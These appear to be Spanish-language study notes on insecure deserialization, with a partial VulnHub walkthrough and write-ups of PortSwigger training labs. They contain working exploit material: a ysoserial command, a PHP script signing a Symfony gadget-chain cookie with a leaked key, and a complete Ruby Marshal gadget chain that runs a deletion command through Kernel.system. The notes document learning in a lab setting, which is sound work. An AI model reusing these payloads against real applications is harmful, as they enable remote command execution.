-------
Los **ataques de deserialización** son un tipo de ataque que aprovecha las vulnerabilidades en los procesos de **serialización** y **deserialización** de objetos en aplicaciones que utilizan la programación orientada a objetos (**POO**).

La serialización es el proceso de convertir un objeto en una secuencia de **bytes** que puede ser almacenada o transmitida a través de una red. La deserialización es el proceso inverso, en el que una secuencia de bytes es convertida de nuevo a un objeto. Los ataques de deserialización ocurren cuando un atacante puede manipular los datos que se están deserializando, lo que puede llevar a la **ejecución de código malicioso** en el servidor.

Los ataques de deserialización pueden ocurrir en diferentes tipos de aplicaciones, incluyendo aplicaciones web, aplicaciones móviles y aplicaciones de escritorio. Estos ataques pueden ser explotados de varias maneras, como:

- Modificar el objeto serializado antes de que sea enviado a la aplicación, lo que puede causar errores en la deserialización y permitir que un atacante ejecute código malicioso.
- Enviar un objeto serializado malicioso que aproveche una vulnerabilidad en la aplicación para ejecutar código malicioso.
- Realizar un ataque de “**man-in-the-middle**” para interceptar y modificar el objeto serializado antes de que llegue a la aplicación.

Los ataques de deserialización pueden ser muy peligrosos, ya que pueden permitir que un atacante tome el control completo del servidor o la aplicación que está siendo atacada.

Para evitar estos ataques, es importante que las aplicaciones validen y autentiquen adecuadamente todos los datos que reciben antes de deserializarlos. También es importante utilizar bibliotecas de serialización y deserialización seguras y actualizar regularmente todas las bibliotecas y componentes de la aplicación para corregir posibles vulnerabilidades.

A continuación se os proporciona el enlace directo a la máquina de Vulnhub donde explotamos un ‘**PHP Deserialization Attack**‘:

- **Máquina Cereal 1**: [https://www.vulnhub.com/entry/cereal-1,703/](https://www.vulnhub.com/entry/cereal-1,703/)

## Notas de las practicas

ya con la maquina desplegada vamos a ir un poco mas a tiro echo donde vamos a realizar fuzzing a la web alojada en el puerto 80:

```bash
gobuster dir -u http://192.168.1.73 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
```

![[Pasted image 20250826181028.png]]

como podemos observar tenemos 2 directorios vamos a abrir los dos a ver que nos encontramos:

![[Pasted image 20250827093247.png]]

en este caso no nos llama la atención ninguna de las dos por lo que vamos ahora a escanear el puerto 44441:

```bash
gobuster vhost -u http://cereal.ctf:44441/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 20 --append-domain
```

![[Pasted image 20250827093630.png]]

podemos ver que tenemos un subdominio en la web por lo que vamos a ver que contiene:

## PortSwigger

### Lab: Modifying serialized objects

En este laboratorio se nos pide intentar vulnerar la deserialización de un objeto, al parecer esto se encuentra en la cookie de sesión por lo tanto vamos a intentar iniciar sesión con las credenciales que nos dieron y vamos a ver que tiene de especial la cookie.

Vamos a capturar un petición que contenga la cookie de sesión:

![[{EE7E8889-19BC-41BE-929A-90FCAB9DFA05}.png]]

vemos que al seleccionar la cookie en el lado derecho BurpSuite se encarga de verificar el contenido en diferentes lenguajes y que al final hace un decode en `base64` que nos da información sobre el usuario donde vemos que para un parámetro `admin` se le asigna un valor `booleano` de `0` donde podemos desde el mismo panel cambiarlo a 1 que seria un `True` y aplicar cambios para usarla:

![[{6B1698DF-48BE-4A91-A44B-CE083D67DF7F}.png]]

Vemos que la cookie no cambia mucho pero con esto simplemente ya nos permite el acceso a un panel de administración, con esto podemos intentar usar la cookie en el navegador.

Un dato extra que tenemos que tomar en cuenta es la estructura que se esta usando, la estructura al parecer es de PHP Serialize Object.

Vemos ahora si esto ya en el navegador:

![[{0FF8820C-41C7-44D4-80CD-66DBFB3DA2B9}.png]]

ya podemos administrar usuarios, eliminemos al usuario `carlos` y terminemos con el laboratorio:

![[{F83DFC42-312F-4C55-B2CD-2B8FDD3D4C61}.png]]

Lab terminado.


### Lab: Modifying serialized data types

En este laboratorio lo que vamos a ver es que es vulnerable a un bypass en la authentication, tenemos que editar el objeto que viaja en la cookie de sesión, vamos a intentar ingresar como administrador y luego eliminar el usuario `carlos`.

Bueno para esto vamos a capturar el como se tramita el panel de authentication con el objetivo de ver la data serializada que supuestamente se tramita en la cookie de sesión mientras estamos como el usuario `wiener` del cual tenemos las credenciales:

![[{3D515CA1-500C-4B96-9CBE-48F3B8F9CF4A}.png]]

vemos lo mismo, el objeto esta en base64 y al decodificarlo obtenemos la información del usuario, por practicidad vamos a llevarlo a la consola para verlo mucho mejor:
![[{C07494C6-E9DF-4051-9163-71A100F8738D}.png]]

perfecto ahora vemos mucho mas claro y vemos que contamos con un `access_token` de 32 caracteres el cual puede estar encargado de que no asegurar la integridad del usuario.

Ahora como se nos dijo al inicio de la maquina nosotros podemos editar este tipo de datos y modificarlos y la idea es cambiar dos campos el primero será el de `username` y el otro el de `access_token` quedando de la siguiente forma:

![[{38F7B4E9-5A6E-4B7C-8AFC-BE03631B8287}.png]]

perfecto podemos aplicar los cambios y enviar la petición a ver que obtenemos:

![[{30A9649C-25E3-4CC6-8086-E4A590143468}.png]]

perfecto la cookie ya es valida al parecer vamos a hacerlo desde el navegador y a eliminar al usuario carlos:

![[{9A52863A-9CC0-4CF7-95C1-A80216CCF26B}.png]]

eliminemos el usuario `carlos` y vemos si logramos completar el lab:

![[{BD0C2772-5093-49A4-901A-A41B6AF0C2E1}.png]]

Lab Terminado.


### Lab: Using application functionality to exploit insecure deserialization

En este laboratorio el objetivo es crear un objeto serializado que la parecer es la cookie de sesión mediante la cual logremos eliminar un archivo dentro del `home` de carlos llamado `morale.txt`. Tenemos acceso como el usuario `wiener`.

Vamos a comenzar iniciando sesión y capturando la petición dentro para ver la cookie:

![[{0E14CD16-D9BE-45B6-94D4-E52A6C6FBAB9}.png]]

perfecto ya tenemos la data serializada la cual para una mejor comprensión vamos a llevarla a la consola:

![[{3E8637B9-6D94-465D-B740-A7CB434048F3}.png]]

estamos viendo la data y algo que llama mucho la atención es que se esta contemplando en `avatar_link` es una ruta.

Nosotros podemos eliminar la cuenta de un usuario pero y que pasa con el avatar, lo que suceda es que también se elimine en este caso el archivo dentro de la ruta, lo que podemos hacer es cambiar la ruta del avatar y apuntar al archivo que nos piden eliminar con el objetivo de que cundo eliminemos la cuenta, se elimine el archivo que se pide eliminar:

![[{DFDAD146-53A0-448C-8066-5A0B038FED25}.png]]

en este caso no voy a enviar la petición sino a remplazar la cookie dentro del navegador para que se establezca la ruta:

![[{D9A58AFB-B327-4B57-9C00-9DA27EAB817D}.png]]

no vemos cambio alguno pero vamos a eliminar la cuenta vamos a ver si logramos completar el lab:

![[{40EB7551-2844-4B8C-ABCB-5420204E664C}.png]]

Lab Terminado.


### Lab: Arbitrary object injection in PHP

El objetivo es el mismo donde para resolver tenemos que crear e inyectar el objeto malicioso que nos permita eliminar el archivo morale.txt dentro del `home` de `carlos`, vamos a tener que obtener código fuente para lograr resolver este laboratorio y nos dan igual que antes las credenciales de `wiener`.

Vamos de igual forma a capturar una petición donde tengamos la sesión iniciada con el objetivo de capturar la cookie de sesión:
![[{DC981460-CF87-4A1F-88D4-0D1E3CD1574D}.png]]

Volvemos a observar el objeto `User` con los campos `username` y `access_token`. En este caso el laboratorio nos habla mas sobre un objeto arbitrario y que nos fijemos en el código fuente por lo que vamos a ver primero si encontramos algo interesante en el código fuente:

![[{87EAF222-7062-49BC-BF61-E0800FEBAD2B}.png]]

vemos una ruta la cual podemos visitar a ver que encontramos:

![[{8074E395-9D6B-47F5-80BF-C8DE0FC72AE7}.png]]\

no vemos nada y es que puede se puede estar interpretando la información que contiene el mismo.

Un concepto importante es que algunos editores de código o texto suele crear copias como de seguridad de los archivos como puede ser vim donde lo que suele hacer es ubicar luego de la extensión un `~`, vemos si esto funciona:

![[{0B9C2C4F-7FF9-445A-BE48-792EA6284C30}.png]]

al parecer si se genero dicha copia para este archivo y pues ya tenemos todo el código que se esta ejecutando, vamos a analizarlo.

Mirando un poco el Código vemos que se esta definiendo y operando con los datos de `tempalte_file_path` y `lock_file_path` ahora si nosotros pensamos un poco en esto lo que sucede es que se podría a alguna de estas variables la ruta del archivo que queremos eliminar y el objetivo seria ver una función que nos permita solo eliminar.

Vemos varios métodos y entre ellos el destructor el cual verifica la existencia de un archivo en este caso el almacenado en `lock_file_path` y que además lo que hace si existe es `unlink` que es una función que elimina archivos en el sistema dentro del servidor.

Esto ya es muy interesante y para comprender el como podemos ejecutar el método `destruct` tenemos que comprender que cuando un objeto se inicia sin la asignación de este a una variable el objeto pasara por todo su ciclo de vida esto conlleva desde la creación, hasta su destrucción y es de esto de lo que vamos a tratar de aprovecharnos.

Bueno lo que vamos a hacer es tomando como base el objeto ya generado, crearemos uno con los datos que hemos obtenido de el archivo analizado a ver si logramos eliminar el archivo y nos quedaría de la siguiente forma:

![[{3795EBFF-FB04-4223-BFA1-3E8B32C174EF}.png]]

lo pasamos por el BurpSuite para que nos genere la cookie:

![[{E4A98AF5-8739-4815-9774-FBFD16502C60}.png]]

ahora copiamos la cookie y usamos en el navegador a ver si funciona:

![[{48EF75A6-AD4A-4258-85FC-2542287C25B1}.png]]

se genero un error pero la maquina se completa, esto quiere decir que el archivo si se elimino.

Lab Terminado.

### Lab: Exploiting Java deserialization with Apache Commons

El objetivo es crear un payload malicioso implementando una utilidad la cual en el proceso se explicara y al igual que en las anteriores tenemos las credenciales de `wiener`, al igual que el objetivo será eliminar el archivo `morale.txt` que se encuentra en el `home` del usuario `carlos`.

Bueno, lo primero que vamos a hacer es descargar la utilidad de `ysoserial-all` la cual contiene una gran cantidad de Gatged chains que son cadenas de clases existentes que nos permitirán ejecutar código o comandos de forma remota al momento de desrealizar un objeto.

![[{6C93FA87-87B2-46DF-A959-0A91454C1871}.png]]
tenemos mucho y cave comentar que cada uno tiene librerías y métodos distintos de alcanzar la ejecución de comandos.

podemos intentar hacer lo siguiente para crear el payload:
```bash
java -jar ysoserial-all.jar CommonsCollections1 'whoami'
```

![[{F462974A-FEB6-455B-839E-351F5703D532}.png]]

Bueno, vamos a capturar una petición la cual nos permita ver en si como se esta generando la cookie primero:
![[{B5725FBD-B0ED-4CB4-B400-E7803507A35B}.png]]

Por como vemos tiene que estar en base64 y luego tenemos que hacerle un url-encode, entonces para generar el base 64 va a ser de la siguiente manera:

![[{20B84B20-D9D4-4AF1-88CF-1433411DD11C}.png]]

Con esto ya tenemos la cookie respectiva que ejecutara el comando, en este punto falta pasarle todo a url-encode, para ver que sucede:
![[{0DF59856-5FBC-4F90-84CE-F59EFFAC138B}.png]]

esa en especial no le gusta pero nosotros tenemos referente a common collection varios y luego de probar la mayoría obtenemos que el correcto es el de `CommonsCollections4` y lo mismo, vamos a ver si ahora funciona:
![[{8DB278F9-09ED-46AB-9979-C64BF182B291}.png]]

Lab Terminado.

### Lab: Exploiting PHP deserialization with a pre-built gadget chain

En este caso tenemos el mismo caso que de la maquina anterior pero para php ya que vamos a crear un payload mediante un Gadget para eliminar el archivo `morale.txt` y para esto lo que vamos a implementar es otra herramienta parecida a `ysoserial` que se llama `phpggc`, Algo adicional que tenemos que hacer es la identificación del framework.

Vamos a comenzar buscando en el código fuente a ver si algo encontramos:

![[{17040B07-A0D6-432A-8756-11AE91F5CB0A}.png]]
Entramos una ruta la cual podemos visitar a ver que encontramos:
![[{BB49BA51-83E9-4BEA-95A8-7E29123D30DC}.png]]

vemos que tenemos un `phpinfo` que si nos lista parte de la información y permisos configurados en el aplicativo de `php`.

Eso lo dejaremos por el momento y vamos a ver como esta construida la cookie a ver que podemos conseguir:

![[{38C4CB14-61CA-4FA9-90ED-24C970C03601} 1.png]]

vemos que tenemos la información solo url-encode y nos representa sus valores, vamos a llevarnos estos a parte para verlos mucho mejor:

![[{F21F46C5-427F-412B-938F-69CFF646C8A1}.png]]

vemos parte de la cadena en base64, vamos a decodificarla a ver que tenemos:

![[{671F3A19-A9BC-41E5-986C-1B9D73077BA5}.png]]

vemos un objeto como en maquinas anteriores y cosas que se nos pueden venir a la mente son cambiar el tipo de dato de `access_token`, cambiar el nombre de usuario y mas pero algo que llama la atención es que todo esto en la cadena anterior esta acompañado de un `sig_hmac_sha1` que es una especie de firma que nos permite verificar la integridad de un mensaje.

El problema radica en que si manipulamos la integridad de estos datos cambiando algo su firma también cambiara y si no tiene coherencia la firma con el contenido, esto no será valido.

Y el como se crea esta firma es en concepto sencillo, se necesita de un contenido (datos) y una secret key la cual no sabemos cual es, pero si recordamos nosotros tenemos información del panel de `phpinfo` mediante el cual podríamos filtrar por key y deberíamos encontrar la `secret key` filtrada por lo que ya tenemos todo:

![[{1BA0BAE0-69F5-43D5-8053-2811532FD3DF}.png]]

con esto lo único que nos falta es entender cual es la forma y el gadget que tenemos que usar en el `phpggc` para generar el payload y lo vamos a hacer por partes.

Para encontrar el gadget podemos tratar de generar algún error en la cookie borrando caracteres con el objetivo de que se filtre el método usado:

![[{1713E3AE-4BC6-4CB9-9F5B-D1462261DB74}.png]]

vemos que nos hablan de Symfony por lo que podemos intentar usar ahora el `phpggc` con Symfony a ver que conseguimos:

![[{8A5056B8-AEBE-48A2-8ECD-FF74D5EAF11E}.png]]

vemos que la versión es la `4.3.6` y si observamos el gadget vemos que nos cubre de la `4.3.0` hasta la `4.3.7` por lo que este seria el optimo:

![[{6D4C2FE6-96C2-491B-8990-BD8149235598} 1.png]]

vemos como lo estamos utilizando y como generamos ya un objeto valido que ejecuta el comando para eliminar el archivo `morale.txt`, recordemos que este objeto tiene que estar en base64 por lo que vamos a convertirlo y dejarlo listo:

![[{AAF2DB7D-4C13-4F61-8A51-F6D17C4BC5CC}.png]]

perfecto ya tenemos la primera parte y ahora lo que vamos a hacer es crear un pequeño código en php que nos permita generar la cookie completa de la siguiente manera:
```php
<?php

$object = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==";
$secretkey = "jefy711ar0zkh0z3vpry5tpmer8yc10r";
$cookie = '{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretkey) . '"}';

echo $cookie;

?>

```

Ejecutemos el código a ver si nos genera lo que esperamos:
![[{62E4A5E5-2A55-4D75-B560-8130B156FDB8}.png]]

al parecer si y vamos a de una vez realizar un url code para luego utilizarlo:

![[{EC8D0E1C-64C3-4E8C-91FA-CC2EE9F5C0B0}.png]]

vamos a usarla a ver que sucede:

![[{52A21604-1506-4421-A3C9-951C9B143BC8}.png]]

Vemos que ya tenemos el lab Terminado por lo que si logramos la ejecución de comandos.

### Lab: Exploiting Ruby deserialization using a documented gadget chain

Bueno nos pide los mismo que en los últimos laboratorios y el objetivo actual es mediante documentación intentar eliminar el archivo `morale.txt` que de igual manera pero en este caso se emplea el lenguaje de ruby.

Vamos a comenzar interceptando la petición del home mientras estamos como wiener para ver la cookie:

![[{7D7CAA42-B915-42B7-B476-1B96042F1E0B}.png]]

la cadena luego de cambiar el Decoder a base64 vemos que es algo extraña aunque vemos que viaja cosas como el username y un token por lo que la idea seria crear algo que nos permite generar la ejecución remota de comandos.

Mediante una lectura y búsqueda en internet vamos a ver que obtenemos un script, el cual ya modificado vamos a ver lo siguiente:

```ruby
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts payload

```

perfecto pero esto no funciona en las versiones actuales, por lo que para probarlo lo que vamos a hacer es correr un docker con una versión anterior de la siguiente manera:

```bash
docker run -it --rm ruby:2.7 bash
```

ya dentro del contenedor ejecutamos el archivo y vemos si nos crea la cookie:

![[{E4654004-2825-4B41-B529-08FFA790649C}.png]]

vemos que ya tenemos algo similar a lo que teníamos en la cookie original, pero esto no esta en base64 por lo que podemos convertirlo modificando el código de la siguiente manera:
```rb
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer
 
require 'base64'   
 
# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end
 
wa1 = Net::WriteAdapter.new(Kernel, :system)
 
rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")
 
wa2 = Net::WriteAdapter.new(rs, :resolve)
 
i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")
 
 
n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)
 
t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)
 
r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)
 
payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts Base64.encode64(payload)  
```

vamos a ver como nos responde esto:

![[{B60F2416-7EF0-4A72-AD5C-D23C109246E9}.png]]

esto esta mejor, vamos a eliminar los saltos de línea para compactarlo y vamos a ver si funciona:
![[{8488E740-B550-476A-9D1D-AE8C7BB37BEC}.png]]

Ahora lo que podemos hacer es intentar utilizarlo en la cookie y ver si esto funciona:

![[{1768A14E-47DD-48D7-9770-DEB1C3470C7F}.png]]

Lab Terminado.

### Lab: Developing a custom gadget chain for Java deserialization

En este laboratorio vamos a estar como el usuario wiener y el punto es que va a viajar algo serializado donde tenemos que explotarla para lograr migrar al usuario administrador obteniendo su contraseña y el objetivo es eliminar al usuario `carlos`.

Vamos a comenzar con la captura de la petición estando como el usuario `wiener` de la siguiente manera:

![[{9F56A8AD-2B1C-495B-9A3A-10632423CCF9}.png]]

vemos que la data esta en base64 para ver que es lo que se esta tramitando:

![[{05AB50EB-7130-4E6A-9BB9-12C6F135A950} 1.png]]

Bueno vemos que tenemos un poco de información pero como no es del todo legible no podemos cambiar en realidad nada de por aquí, vamos a buscar en el código fuente de la web a ver que encontramos:

![[{1B88A903-0038-45B1-B06C-90DCA4386CBE}.png]]

vemos que nos da una ruta de un backup, el cual podemos entrar a ver que logramos obtener:

![[{80A87946-5408-4065-8943-7023AFD786DB}.png]]

podemos observar que tiene el código fuente en java, el cual vamos a analizar para ver si podemos sacarle provecho.

vemos que en si es una clase publica que pude ser interesante si logramos conectarlo con algo mas, podemos ver si el directorio backup tiene permisos de listar archivos y si tiene mas archivos:
![[{F6B822C4-9774-4F48-A19A-01957729E3AF}.png]]

vemos otro archivo veamos su contenido:

![[{10BD125F-AD17-47CC-BEC3-E737864A78D8}.png]]

vemos una clase publica también `ProductTemplate` donde su constructor solo necesita el parámetro `id`, si revisamos mas por debajo lo que encontramos es una petición sql a la cual se le esta concatenando el valor de `id` esto es interesante porque si mediante la deserialización insegura podríamos explotar una sql Inyección en este caso.

Bueno nosotros vamos a tener que crear un script personalizado en java pero en este caso PortSwigger ya nos brinda uno que lo encontraremos en:
https://github.com/PortSwigger/serialization-examples

vamos usar ese repositorio donde vamos a usar el recurso en java.

primero nos llevamos el main:
![[{CAED91CC-1054-48FD-9D72-F28E321A4443}.png]]

Tambien vamos a necesitar las clases que se encuentran dentro del directorio también quedando 3 archivos:
![[{3C9B2DE9-721B-48DF-A033-EFC3AC96C6B8}.png]]

Bueno ya con todo esto nosotros tenemos el control del valor del `id` entonces modificamos eso para pasarle una comilla a ver que error acontecemos:

![[{A81DE8A8-7C68-416A-A3ED-7DF65F98D310}.png]]

creamos el objeto para ver el error:

![[{35C39A51-1441-4291-803E-630DBA0DED77}.png]]

perfecto ahora podemos cambiarlo en el BurpSuite a ver si logramos acontecer el error:
![[{88AC13B8-ECC4-4427-A3C3-D24F542ACB95}.png]]

excelente si observamos el error logramos dejar colgada una comilla, con esto confirmamos que ingresamos información y tenemos control de ese campo.

Ahora lo que vamos a intentar pequeños ataques de sql para descubrir la contraseña de `administrator`:

![[{C40839EE-499B-4EE7-AC70-323DDB0A6FC1}.png]]

![[{41F94BEB-8203-4F0F-9671-04AED003AA4E}.png]]

En mi caso lo primero me me vino a la mente es el usar una SQLI basada en errores donde tratamos de que los errores nos filtren de forma textual la información. en este punto lo que vamos a hacer es lo mismo pero para que nos liste la contraseña:

![[{ADAB3327-2C78-4EBF-907C-8C26137F6BC3}.png]]

![[Pasted image 20251008135441.png]]

vemos que tenemos lo que parece ser la contraseña y podemos usarla:

![[{B712CFEB-1587-4AE7-9349-4064BF279FD3}.png]]

perfecto eliminemos al usuario `carlos` y vemos si se completa el laboratorio:

![[{4A127F66-CD1B-495C-B539-B55D81A879F9}.png]]

Lab Terminado.


### Lab: Developing a custom gadget chain for PHP deserialization

Al igual que en el laboratorio anterior lo que vamos a hacer es mediante un exploit personalizado crear un payload y eliminar el archivo en este caso `morale.txt` que se encuentra en el home del usuario `carlos`.

Vamos a comenzar directamente interceptando una petición que tramite la cookie de session para ver como se esta tramitando el objeto:

![[{3D752312-3972-4A18-A6F9-315951C4F5CD}.png]]
Podemos observar claramente el objeto con campos `username y access_token`, al igual que en maquinas anteriores podemos investigar el código fuente a ver que encontramos:

![[{62653D6E-387D-469D-BBCF-2FEDB6F6E7F7}.png]]

podemos observar una ruta, vamos a ver de que se trata:

![[{E54EF24D-221F-416E-A832-6B55CEDF56FB}.png]]

vemos que al parecer se esta listando el código y no se ve nada, podemos intentar como en otra maquina revisar por un archivo backup ubicando una `~` al final:

![[{027F2842-3CE2-4893-B4AF-129018D91E54}.png]]

listo, vamos a traernos el contenido del archivo a local para poder analizarlo:

Siguiendo un poco el siclo de como funciona este código encontramos la lógica pero vemos que no se usa la clase `DefaultMap` esta es especial y la clave de todo ya que cuenta con el método `__get` el cual se ejecuta cuando una instancia no es existente y se le pasa una función a ejecutar y el argumento no existente, cuando esto pasa es donde podemos pasarle una funcion `exec` para ejecutar comando y que reciba como argumento el valor de `rm /hom/carlos/morate.txt` ahora para aprovecharnos de esto vamos a agregar unas lineas donde vamos a cambiar el flujo actual para que se llame de la siguiente manera a esta clase, además de que para evitar errores y como podemos editar el archivo vamos a cambiar todo a publico:
![[{A4432F23-F4A5-46B9-8D04-ED6DD611D9AC}.png]]

vemos que tenemos tenemos listo, vamos a ver que nos devuelve esto:

![[{E9761194-9B4E-4546-A474-3551F7471C7D}.png]]

perfecto ya tenemos el objeto, podemos intentar usarlo desde el burp suite a ver que conseguimos:

![[{F856AE22-8EBB-4FE6-9566-2CC378CABCCC}.png]]

vemos un error pero si revisamos la web principal vamos a observar que se completo el lab:

![[{D4D77245-4278-4894-97BC-19443C4D7F70}.png]]

Lab Terminado.